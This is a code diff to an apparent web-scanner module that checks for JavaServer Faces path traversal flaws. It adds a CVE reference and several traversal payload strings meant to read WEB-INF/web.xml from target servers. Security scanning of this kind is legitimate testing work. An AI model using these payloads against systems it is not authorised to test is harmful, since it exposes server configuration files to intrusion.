@@ -32,7 +32,8 @@ public class JavaServerFacesTraversal implements IModule {
             + "http://seclists.org/fulldisclosure/2012/Feb/150<br />"
             + "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-3827<br />"
             + "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-4367<br />"
-            + "http://security.coverity.com/advisory/2013/Oct/two-path-traversal-defects-in-oracles-jsf2-implementation.html";
+            + "http://security.coverity.com/advisory/2013/Oct/two-path-traversal-defects-in-oracles-jsf2-implementation.html<br />"
+            + "https://nvd.nist.gov/vuln/detail/CVE-2018-14371";
     private static final String REMEDY = "Upgrade to the latest version of the JSF framework.";
             
     private PrintWriter stderr;
@@ -57,9 +58,12 @@ public class JavaServerFacesTraversal implements IModule {
         jsfTraversal.add("javax.faces.resource.../WEB-INF/web.xml.jsf");
         jsfTraversal.add("javax.faces.resource.../WEB-INF/web.xml.xhtml");
         jsfTraversal.add("javax.faces.resource./WEB-INF/web.xml.jsf?ln=..");
+        jsfTraversal.add("javax.faces.resource/…\\\\WEB-INF/web.xml"); 
+        jsfTraversal.add("jenia4faces/template/../WEB-INF/web.xml/ ");
         
         jsfTraversal.add("/faces/javax.faces.resource/web.xml?ln=..\\\\WEB-INF");
         jsfTraversal.add("/faces/javax.faces.resource/..\\\\WEB-INF/web.xml");
+        jsfTraversal.add("/faces/javax.faces.resource/web.xml?loc=../WEB-INF");
 
         String host = completeURI.getHost();
         String protocol = completeURI.getProtocol();
